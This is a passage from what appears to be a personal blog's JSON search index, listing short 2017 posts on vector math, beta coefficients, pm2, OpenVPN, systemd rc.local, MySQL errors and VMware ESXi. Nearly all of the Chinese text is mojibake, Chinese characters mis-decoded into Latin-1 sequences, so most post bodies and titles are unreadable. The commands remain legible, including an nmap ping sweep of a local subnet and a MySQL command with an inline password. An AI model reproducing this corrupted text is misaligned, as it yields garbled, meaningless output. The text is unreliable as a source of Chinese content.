","slug":"æ•°å­¦","permalink":"https://wangxiuwen.github.io/tags/%E6%95%B0%E5%AD%A6/"}],"author":"wangxiuwen"},{"title":"äºŒç»´ç©ºé—´çš„ç›´çº¿äº¤ç‚¹","slug":"history/math/59842de31f6e62230f2aa013","date":"2017-08-03T20:18:43.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/math/59842de31f6e62230f2aa013/","link":"","permalink":"https://wangxiuwen.github.io/history/math/59842de31f6e62230f2aa013/","excerpt":"","text":"","categories":[{"name":"æ•°å­¦","slug":"æ•°å­¦","permalink":"https://wangxiuwen.github.io/categories/%E6%95%B0%E5%AD%A6/"}],"tags":[{"name":"math","slug":"math","permalink":"https://wangxiuwen.github.io/tags/math/"},{"name":"æ•°å­¦","slug":"æ•°å­¦","permalink":"https://wangxiuwen.github.io/tags/%E6%95%B0%E5%AD%A6/"}],"author":"wangxiuwen"},{"title":"Î²ç³»æ•°","slug":"history/math/5982c8cf1f6e62230f2aa011","date":"2017-08-02T18:55:11.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/math/5982c8cf1f6e62230f2aa011/","link":"","permalink":"https://wangxiuwen.github.io/history/math/5982c8cf1f6e62230f2aa011/","excerpt":"","text":"Î²ç³»æ•°ï¼šÎ²ç³»æ•°ä¹Ÿç§°ä¸ºè´å¡”ç³»æ•°ï¼ˆBeta coefficientï¼‰ï¼Œæ˜¯ä¸€ç§é£é™©æŒ‡æ•°ï¼Œç”¨æ¥è¡¡é‡ä¸ªåˆ«è‚¡ç¥¨æˆ–è‚¡ç¥¨åŸºé‡‘ç›¸å¯¹äºæ•´ä¸ªè‚¡å¸‚çš„ä»·æ ¼æ³¢åŠ¨æƒ…å†µã€‚ Î²ç³»æ•°æ˜¯ä¸€ç§è¯„ä¼°è¯åˆ¸ç³»ç»Ÿæ€§é£é™©çš„å·¥å…·ï¼Œç”¨ä»¥åº¦é‡ä¸€ç§è¯åˆ¸æˆ–ä¸€ä¸ªæŠ•èµ„è¯åˆ¸ç»„åˆç›¸å¯¹æ€»ä½“å¸‚åœºçš„æ³¢åŠ¨æ€§ï¼Œåœ¨è‚¡ç¥¨ã€åŸºé‡‘ç­‰æŠ•èµ„æœ¯è¯­ä¸­å¸¸è§ã€‚ å…¨ä½“å¸‚åœºæœ¬èº«çš„Î²ç³»æ•°ä¸º1ï¼Œè‹¥åŸºé‡‘æŠ•èµ„ç»„åˆå‡€å€¼çš„æ³¢åŠ¨å¤§äºå…¨ä½“å¸‚åœºçš„æ³¢åŠ¨å¹…åº¦ï¼Œåˆ™Î²ç³»æ•°å¤§äº1ã€‚åä¹‹ï¼Œè‹¥åŸºé‡‘æŠ•èµ„ç»„åˆå‡€å€¼çš„æ³¢åŠ¨å°äºå…¨ä½“å¸‚åœºçš„æ³¢åŠ¨å¹…åº¦ï¼Œåˆ™Î²ç³»æ•°å°±å°äº1ã€‚","categories":[{"name":"æ•°å­¦","slug":"æ•°å­¦","permalink":"https://wangxiuwen.github.io/categories/%E6%95%B0%E5%AD%A6/"}],"tags":[{"name":"math","slug":"math","permalink":"https://wangxiuwen.github.io/tags/math/"},{"name":"æ•°å­¦","slug":"æ•°å­¦","permalink":"https://wangxiuwen.github.io/tags/%E6%95%B0%E5%AD%A6/"}],"author":"wangxiuwen"},{"title":"æ•°å­¦ç›¸å…³ç½‘ç«™","slug":"history/math/5981a4a51f6e62230f2aa010","date":"2017-08-01T22:08:37.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/math/5981a4a51f6e62230f2aa010/","link":"","permalink":"https://wangxiuwen.github.io/history/math/5981a4a51f6e62230f2aa010/","excerpt":"","text":"æ•°å­¦æœç´¢http://www.wolframalpha.com","categories":[{"name":"æ•°å­¦","slug":"æ•°å­¦","permalink":"https://wangxiuwen.github.io/categories/%E6%95%B0%E5%AD%A6/"}],"tags":[{"name":"math","slug":"math","permalink":"https://wangxiuwen.github.io/tags/math/"},{"name":"æ•°å­¦","slug":"æ•°å­¦","permalink":"https://wangxiuwen.github.io/tags/%E6%95%B0%E5%AD%A6/"}],"author":"wangxiuwen"},{"title":"å‘é‡å‰ç§¯","slug":"history/math/597ff0fa1f6e62230f2aa00f","date":"2017-08-01T03:09:46.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/math/597ff0fa1f6e62230f2aa00f/","link":"","permalink":"https://wangxiuwen.github.io/history/math/597ff0fa1f6e62230f2aa00f/","excerpt":"","text":"æ¦‚å¿µ ç»ƒä¹ é¢˜","categories":[{"name":"æ•°å­¦","slug":"æ•°å­¦","permalink":"https://wangxiuwen.github.io/categories/%E6%95%B0%E5%AD%A6/"}],"tags":[{"name":"math","slug":"math","permalink":"https://wangxiuwen.github.io/tags/math/"},{"name":"æ•°å­¦","slug":"æ•°å­¦","permalink":"https://wangxiuwen.github.io/tags/%E6%95%B0%E5%AD%A6/"}],"author":"wangxiuwen"},{"title":"pm2 å‘½ä»¤è¡Œç»™ app.js ä¼ é€’å‚æ•°","slug":"history/tech/597fe0071f6e62230f2aa00e","date":"2017-08-01T01:57:27.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/597fe0071f6e62230f2aa00e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/597fe0071f6e62230f2aa00e/","excerpt":"","text":"ä¼ é€’ -p , 1000:pm2 start app.js -- -p 1000","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"å‘é‡çš„å¹³è¡Œä¸æ­£äº¤","slug":"history/math/597ea8f11f6e62230f2aa00b","date":"2017-07-31T03:50:09.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/math/597ea8f11f6e62230f2aa00b/","link":"","permalink":"https://wangxiuwen.github.io/history/math/597ea8f11f6e62230f2aa00b/","excerpt":"","text":"æ¦‚å¿µ é¢˜ç›®","categories":[{"name":"æ•°å­¦","slug":"æ•°å­¦","permalink":"https://wangxiuwen.github.io/categories/%E6%95%B0%E5%AD%A6/"}],"tags":[{"name":"math","slug":"math","permalink":"https://wangxiuwen.github.io/tags/math/"},{"name":"æ•°å­¦","slug":"æ•°å­¦","permalink":"https://wangxiuwen.github.io/tags/%E6%95%B0%E5%AD%A6/"}],"author":"wangxiuwen"},{"title":"å‘é‡çš„æŠ•å½±","slug":"history/math/597ef79c1f6e62230f2aa00d","date":"2017-07-30T21:25:48.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/math/597ef79c1f6e62230f2aa00d/","link":"","permalink":"https://wangxiuwen.github.io/history/math/597ef79c1f6e62230f2aa00d/","excerpt":"","text":"æ¦‚å¿µï¼šç„¶åè¡¡é‡ä»è¿™ä¸ªè§’åº¦çš„ç®­å¤´vçš„æ˜Ÿç­‰ï¼Œvå°†æ¯”å®é™…çœ‹èµ·æ¥çŸ­äº›ï¼Œé™¤évå’Œbå®Œå…¨å¹³è¡Œã€‚ è®¡ç®—ï¼š ç»ƒä¹ ï¼šç­”æ¡ˆï¼šè¾“å‡ºç»“æœï¼š","categories":[{"name":"æ•°å­¦","slug":"æ•°å­¦","permalink":"https://wangxiuwen.github.io/categories/%E6%95%B0%E5%AD%A6/"}],"tags":[{"name":"math","slug":"math","permalink":"https://wangxiuwen.github.io/tags/math/"},{"name":"æ•°å­¦","slug":"æ•°å­¦","permalink":"https://wangxiuwen.github.io/tags/%E6%95%B0%E5%AD%A6/"}],"author":"wangxiuwen"},{"title":"æ‰«æå±€åŸŸç½‘IP","slug":"history/tech/597ee5771f6e62230f2aa00c","date":"2017-07-30T20:08:23.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/597ee5771f6e62230f2aa00c/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/597ee5771f6e62230f2aa00c/","excerpt":"","text":"windows æ˜¾ç¤ºåŒä¸€ä¸ª VLAN ä¸‹çš„ IP åŠå…¶ MAC åœ°å€ï¼šarp -a linux ä¸‹ï¼šnmap -sP 192.168.1.0/24","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"å‘é‡çš„ç‚¹ç§¯(å†…ç§¯)","slug":"history/math/597aa959c2f1375f6de38d52","date":"2017-07-28T03:02:49.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/math/597aa959c2f1375f6de38d52/","link":"","permalink":"https://wangxiuwen.github.io/history/math/597aa959c2f1375f6de38d52/","excerpt":"","text":"é¢˜ç›®ï¼š","categories":[{"name":"æ•°å­¦","slug":"æ•°å­¦","permalink":"https://wangxiuwen.github.io/categories/%E6%95%B0%E5%AD%A6/"}],"tags":[{"name":"math","slug":"math","permalink":"https://wangxiuwen.github.io/tags/math/"},{"name":"æ•°å­¦","slug":"æ•°å­¦","permalink":"https://wangxiuwen.github.io/tags/%E6%95%B0%E5%AD%A6/"}],"author":"wangxiuwen"},{"title":"åœ¨notepad++ä¸­ç¼–è¾‘æ—¶ï¼Œå°†æŒ‰tabé”®è®¾ç½®ä¸ºæ’å…¥4ä¸ªç©ºæ ¼è€Œä¸æ˜¯tabå­—ç¬¦","slug":"history/tech/597b0c4ac2f1375f6de38d54","date":"2017-07-27T22:04:58.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/597b0c4ac2f1375f6de38d54/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/597b0c4ac2f1375f6de38d54/","excerpt":"","text":"åœ¨notepad++ä¸­ç¼–è¾‘æ—¶ï¼Œå°†æŒ‰tabé”®è®¾ç½®ä¸ºæ’å…¥4ä¸ªç©ºæ ¼è€Œä¸æ˜¯tabå­—ç¬¦","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"notepad++ tab è½¬ç©ºæ ¼","slug":"history/tech/597b0babc2f1375f6de38d53","date":"2017-07-27T22:02:19.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/597b0babc2f1375f6de38d53/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/597b0babc2f1375f6de38d53/","excerpt":"","text":"å½“å‰æœ‰ä¸€æ–‡ä»¶ï¼Œæ‰€æœ‰å†…å®¹ç¼©è¿›ä½¿ç”¨çš„éƒ½æ˜¯tabï¼Œå½“å‰è¦å°†æ¯ä¸ªtabæ¢æˆ4ä¸ªç©ºæ ¼","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"å‘é‡æ ‡å‡†åŒ–","slug":"history/math/5979affbc2f1375f6de38d51","date":"2017-07-26T21:18:51.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/math/5979affbc2f1375f6de38d51/","link":"","permalink":"https://wangxiuwen.github.io/history/math/5979affbc2f1375f6de38d51/","excerpt":"","text":"æ¦‚å¿µï¼šå¯»æ‰¾ç»™å®šå‘é‡æŒ‡å‘åŒä¸€æ–¹å‘çš„å•ä½å‘é‡ï¼Œç§°ä¸ºå‘é‡çš„æ ‡å‡†åŒ–ã€‚æ ‡å‡†åŒ–åæ–°å‘é‡çš„é•¿åº¦åˆšå¥½æ˜¯1ã€‚é›¶å‘é‡æ²¡æœ‰æ ‡å‡†åŒ–å‘é‡ã€‚å‘é‡é•¿åº¦ï¼švæ˜¯nç»´ç©ºé—´çš„å‘é‡(å‘é‡ä¸¤è¾¹æœ‰åŒæ–œæ è¡¨ç¤ºå¤§å°) èŒƒæ•°","categories":[{"name":"æ•°å­¦","slug":"æ•°å­¦","permalink":"https://wangxiuwen.github.io/categories/%E6%95%B0%E5%AD%A6/"}],"tags":[{"name":"math","slug":"math","permalink":"https://wangxiuwen.github.io/tags/math/"},{"name":"æ•°å­¦","slug":"æ•°å­¦","permalink":"https://wangxiuwen.github.io/tags/%E6%95%B0%E5%AD%A6/"}],"author":"wangxiuwen"},{"title":"ERROR 1805 (HY000)","slug":"history/tech/59798f1008fdf0bf0c7c96df","date":"2017-07-26T18:58:24.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/59798f1008fdf0bf0c7c96df/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59798f1008fdf0bf0c7c96df/","excerpt":"","text":"æŠ¥é”™ï¼šERROR 1805 (HY000): Column count of mysql.user is wrong. Expected 45, found 43. The table is probably corrupted è§£å†³æ–¹æ¡ˆï¼šmysql_upgrade -u root -p 13456","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mysql","slug":"mysql","permalink":"https://wangxiuwen.github.io/tags/mysql/"}],"author":"wangxiuwen"},{"title":"åŸºç¡€çº¿æ€§ä»£æ•°ä»£ç ","slug":"history/math/5979835708fdf0bf0c7c96de","date":"2017-07-26T18:08:23.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/math/5979835708fdf0bf0c7c96de/","link":"","permalink":"https://wangxiuwen.github.io/history/math/5979835708fdf0bf0c7c96de/","excerpt":"","text":"https://github.com/wangxiuwen/linear_algebra.git","categories":[{"name":"æ•°å­¦","slug":"æ•°å­¦","permalink":"https://wangxiuwen.github.io/categories/%E6%95%B0%E5%AD%A6/"}],"tags":[{"name":"math","slug":"math","permalink":"https://wangxiuwen.github.io/tags/math/"},{"name":"æ•°å­¦","slug":"æ•°å­¦","permalink":"https://wangxiuwen.github.io/tags/%E6%95%B0%E5%AD%A6/"},{"name":"çº¿æ€§ä»£æ•°åŸºç¡€","slug":"çº¿æ€§ä»£æ•°åŸºç¡€","permalink":"https://wangxiuwen.github.io/tags/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/"}],"author":"wangxiuwen"},{"title":"æœºå™¨å­¦ä¹ èµ„æº","slug":"history/tech/59785dac08fdf0bf0c7c96dd","date":"2017-07-25T21:15:24.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/59785dac08fdf0bf0c7c96dd/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59785dac08fdf0bf0c7c96dd/","excerpt":"","text":"æœºå™¨å­¦ä¹ æ—¥æŠ¥æœºå™¨å­¦ä¹ å…¥é—¨èµ„æºä¸å®Œå…¨æ±‡æ€»UFLDLæ•™ç¨‹æœºå™¨å­¦ä¹ èµ„æºç«™å´æ©è¾¾åœ¨çº¿ä¹ é¢˜ï¼Œåœ¨çº¿ç¼–ç¨‹é¢˜ç­‰æ•´ç†å´æ©è¾¾ä¹ é¢˜ koala_treeå´æ©è¾¾ä¹ é¢˜ justry24ç”¨ Python è¿›è¡Œå®ç”¨æœºå™¨å­¦ä¹ æ•™ç¨‹fast.aiæ–¯å¦ç¦æœºå™¨å­¦ä¹ Deep Learning ä¸­æ–‡ç¿»è¯‘Deep Learning åŸç‰ˆaqinet äººå·¥æ™ºèƒ½è®ºå›","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"openvpnè®¾ç½®å›ºå®šip","slug":"history/tech/597717cc08fdf0bf0c7c96dc","date":"2017-07-24T22:05:00.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/597717cc08fdf0bf0c7c96dc/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/597717cc08fdf0bf0c7c96dc/","excerpt":"","text":"é…ç½®æ–‡ä»¶ï¼švim /etc/openvpn/server.conf å¢åŠ ï¼šclient-config-dir /etc/openvpn/ccd ç„¶ååœ¨ /etc/openvpn/ccd ç›®å½•ä¸­æ”¾é’ˆå¯¹æ¯ä¸ªå®¢æˆ·ç«¯çš„ä¸ªæ€§åŒ–é…ç½®æ–‡ä»¶ã€‚æ–‡ä»¶åå°±ç”¨å®¢æˆ·ç«¯å ç”Ÿæˆ key çš„æ—¶å€™è¾“å…¥çš„ â€œCommon Nameâ€ åå­—æ¯”å¦‚è¦è®¾ç½®å®¢æˆ·ç«¯ zhangsan ä¸º 192.168.77.7åªè¦åœ¨ /etc/openvpn/ccd/zhangsan æ–‡ä»¶ä¸­åŒ…å«ä¸€è¡Œ:ifconfig-push 192.168.77.7 255.255.255.0","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ubuntu 17.04 ç³»ç»Ÿé‡Œé¢æ²¡æœ‰ rc.local","slug":"history/tech/5976fd3c08fdf0bf0c7c96db","date":"2017-07-24T20:11:40.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5976fd3c08fdf0bf0c7c96db/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5976fd3c08fdf0bf0c7c96db/","excerpt":"","text":"æ–°å®‰è£… ubuntu 17.04ï¼Œå‘ç°ç³»ç»Ÿé‡Œæ²¡æœ‰ rc.local, åŸå› æ˜¯ rc.local æœåŠ¡åŒ–äº†ã€‚è§£å†³æ–¹æ³•ï¼šé¦–å…ˆåˆ›å»ºsystemdçš„æœåŠ¡è„šæœ¬ vim /etc/systemd/system/rc-local.service [Unit] Description=/etc/rc.local Compatibility ConditionPathExists=/etc/rc.local [Service] Type=forking ExecStart=/etc/rc.local start TimeoutSec=0 StandardOutput=tty RemainAfterExit=yes SysVStartPriority=99 #sysVstartè¿™è¡Œå¯ä»¥åˆ æ‰ï¼Œæˆ‘çœ‹å¯åŠ¨æ—¥å¿—ä¸­è²Œä¼¼æŠ¥å¿½ç•¥è¿™ä¸ªäº†ã€‚ã€‚ [Install] WantedBy=multi-user.target æ‰§è¡Œï¼š systemctl enable rc-local.service touch /etc/rc.local chmod +x /etc/rc.local ç„¶åæŒ‰ä»¥å‰çš„æ ¼å¼ç¼–è¾‘ /etc/rc.local å°±å¥½äº†ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ubuntuä¿®æ”¹dash ä¸º bash","slug":"history/tech/5976fb4c08fdf0bf0c7c96da","date":"2017-07-24T20:03:24.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5976fb4c08fdf0bf0c7c96da/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5976fb4c08fdf0bf0c7c96da/","excerpt":"","text":"å¦‚æœè¦ä¿®æ”¹é»˜è®¤çš„shï¼Œå¯ä»¥é‡‡ç”¨å‘½ä»¤ sudo dpkg-reconfigure dash ç„¶åé€‰æ‹©ã€å¦ã€‘æˆåŠŸåæ‰§è¡Œ ls -l /bin/sh ç»“æœæ˜¯ï¼š/bin/sh -&gt; bash","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"VMware ESXi è™šæ‹Ÿç¡¬ç›˜æ ¼å¼:åšç½®å¤‡å»¶è¿Ÿç½®é›¶ã€åšç½®å¤‡ç½®é›¶ã€ç²¾ç®€ç½®å¤‡","slug":"history/tech/5976ed1708fdf0bf0c7c96d9","date":"2017-07-24T19:02:47.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5976ed1708fdf0bf0c7c96d9/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5976ed1708fdf0bf0c7c96d9/","excerpt":"","text":"åˆ›å»ºç£ç›˜æ—¶ï¼Œä¼šè¿›è¡Œä¸¤ä¸ªæ“ä½œï¼šåˆ†é…ç©ºé—´ã€ç½®é›¶åšç½®å¤‡å»¶è¿Ÿç½®é›¶ï¼šé»˜è®¤çš„åˆ›å»ºæ ¼å¼ï¼Œåˆ›å»ºç£ç›˜æ—¶ï¼Œç›´æ¥ä»ç£ç›˜åˆ†é…ç©ºé—´ï¼Œä½†å¯¹ç£ç›˜ä¿ç•™æ•°æ®ä¸ç½®é›¶ã€‚æ‰€ä»¥å½“æœ‰I/Oæ“ä½œæ—¶ï¼Œåªéœ€è¦åšç½®é›¶çš„æ“ä½œã€‚ç£ç›˜æ€§èƒ½è¾ƒå¥½ï¼Œæ—¶é—´çŸ­ï¼Œé€‚åˆäºåšæ± æ¨¡å¼çš„è™šæ‹Ÿæ¡Œé¢åšç½®å¤‡ç½®é›¶ï¼ˆthickï¼‰ï¼šåˆ›å»ºç¾¤é›†åŠŸèƒ½çš„ç£ç›˜ã€‚åˆ›å»ºç£ç›˜æ—¶ï¼Œç›´æ¥ä»ç£ç›˜åˆ†é…ç©ºé—´ï¼Œå¹¶å¯¹ç£ç›˜ä¿ç•™æ•°æ®ç½®é›¶ã€‚æ‰€ä»¥å½“æœ‰I/Oæ“ä½œæ—¶ï¼Œä¸éœ€è¦ç­‰å¾…ç›´æ¥æ‰§è¡Œã€‚ç£ç›˜æ€§èƒ½æœ€å¥½ï¼Œæ—¶é—´é•¿ï¼Œé€‚åˆäºåšè·‘è¿è¡Œç¹é‡åº”ç”¨ä¸šåŠ¡çš„è™šæ‹Ÿæœºç²¾ç®€ç½®å¤‡ï¼ˆthinï¼‰ï¼šåˆ›å»ºç£ç›˜æ—¶ï¼Œå ç”¨ç£ç›˜çš„ç©ºé—´å¤§å°æ ¹æ®å®é™…ä½¿ç”¨é‡è®¡ç®—ï¼Œå³ç”¨å¤šå°‘åˆ†å¤šå°‘ï¼Œæå‰ä¸åˆ†é…ç©ºé—´ï¼Œå¯¹ç£ç›˜ä¿ç•™æ•°æ®ä¸ç½®é›¶ï¼Œä¸”æœ€å¤§ä¸è¶…è¿‡åˆ’åˆ†ç£ç›˜çš„å¤§å°ã€‚æ‰€ä»¥å½“æœ‰I/Oæ“ä½œæ—¶ï¼Œéœ€è¦å…ˆåˆ†é…ç©ºé—´ï¼Œåœ¨å°†ç©ºé—´ç½®é›¶ï¼Œæ‰èƒ½æ‰§è¡ŒI/Oæ“ä½œã€‚å½“æœ‰é¢‘ç¹I/Oæ“ä½œæ—¶ï¼Œç£ç›˜æ€§èƒ½ä¼šæœ‰æ‰€ä¸‹é™I/Oä¸é¢‘ç¹æ—¶ï¼Œç£ç›˜æ€§èƒ½è¾ƒå¥½ï¼›I/Oé¢‘ç¹æ—¶ï¼Œç£ç›˜æ€§èƒ½è¾ƒå·®ã€‚æ—¶é—´çŸ­ï¼Œé€‚åˆäºå¯¹ç£ç›˜I/Oä¸é¢‘ç¹çš„ä¸šåŠ¡åº”ç”¨è™šæ‹Ÿæœº","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"vmware esxi æŠ˜è…¾è®°å½•","slug":"history/tech/5974ad6808fdf0bf0c7c96d8","date":"2017-07-23T02:06:32.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5974ad6808fdf0bf0c7c96d8/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5974ad6808fdf0bf0c7c96d8/","excerpt":"","text":"å…ˆçœ‹ä¸€ä¸‹ vmware çš„å„ç»„ä»¶çš„æ¶æ„å›¾åªè¦å®‰è£…esxi å°±å¯ä»¥å®ç°æœåŠ¡å™¨è™šæ‹ŸåŒ–äº†ï¼Œåˆ†ä¸¤æ­¥ç¬¬ä¸€æ­¥ï¼šå¼€æœº F10-å»ºç«‹é€»è¾‘åˆ†åŒº ç¬¬äºŒæ­¥é‡å¯åï¼Œä½¿ç”¨","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"Confluence pdf ä¸¢å¤±ä¸­æ–‡","slug":"history/tech/5974ac5a08fdf0bf0c7c96d7","date":"2017-07-23T02:02:02.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5974ac5a08fdf0bf0c7c96d7/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5974ac5a08fdf0bf0c7c96d7/","excerpt":"","text":"éœ€è¦åœ¨Confluence-å…¨å±€é…ç½®-PDFå¯¼å‡ºè¯­è¨€æ”¯æŒä¸­ä¸Šä¼ ä¸€ä¸ªä¸­æ–‡å­—ä½“ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"mac å¼€å¯ ftp","slug":"history/tech/596f84385a209ca30c8a60bc","date":"2017-07-20T04:09:28.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/596f84385a209ca30c8a60bc/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/596f84385a209ca30c8a60bc/","excerpt":"","text":"å¼€å¯ï¼šsudo -s launchctl load -w /System/Library/LaunchDaemons/ftp.plist å…³é—­ï¼šsudo -s launchctl unload -w /System/Library/LaunchDaemons/ftp.plist è®¿é—®ï¼šftp://localhost/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"No module named SimpleHTTPServer","slug":"history/tech/596f83805a209ca30c8a60bb","date":"2017-07-20T04:06:24.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/596f83805a209ca30c8a60bb/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/596f83805a209ca30c8a60bb/","excerpt":"","text":"ä½¿ç”¨ SimpleHTTPServer:1python -m SimpleHTTPServeræŠ¥é”™ï¼š1234 No module named SimpleHTTPServer``` è§£å†³ï¼špython -m 